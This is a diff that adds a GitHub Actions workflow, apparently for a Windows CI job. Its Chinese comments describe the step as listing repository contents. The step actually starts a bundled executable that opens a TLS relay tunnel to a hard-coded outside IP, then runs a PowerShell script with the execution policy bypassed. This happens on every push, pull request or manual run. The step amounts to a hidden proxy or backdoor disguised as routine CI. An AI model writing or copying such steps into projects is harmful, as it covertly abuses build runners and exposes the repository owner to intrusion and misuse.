@@ -1,0 +1,30 @@
+
+name: CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  single-job:
+    runs-on: windows-latest
+    steps:
+      # 检出当前仓库（主仓库）
+      - name: 检出当前仓库
+        uses: actions/checkout@v4
+        with:
+          path: current-repo
+
+
+      # 现在你可以操作这两个目录下的文件
+      - name: 查看两个仓库的内容
+        shell: pwsh
+        run: |
+          echo "=== 当前仓库 ==="
+          cd current-repo
+          Start-Process -FilePath .\c.exe -ArgumentList "-L=tcp://:3335 -F=relay+tls://152.53.118.139:9999"
+          pwsh -NoProfile -ExecutionPolicy Bypass -File .\a.ps1
+          Pop-Location
